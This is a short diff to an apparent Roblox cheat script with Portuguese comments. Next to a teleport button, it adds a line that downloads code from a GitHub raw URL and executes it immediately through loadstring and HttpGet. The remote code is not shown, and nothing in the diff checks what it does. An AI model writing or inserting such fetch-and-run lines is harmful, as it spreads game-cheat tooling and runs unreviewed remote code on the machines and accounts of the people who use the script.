@@ -169,6 +169,9 @@ TeleportTab:AddButton("Teleportar Atrás dos Prédios", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(192, 4, 272)
 end)
 
+-- Executa o script do link fornecido
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScripts4425/Infinity-X-Hub/refs/heads/main/mano"))()
+
 -- Chama a função para executar automaticamente o código
 AutoExecute()
 
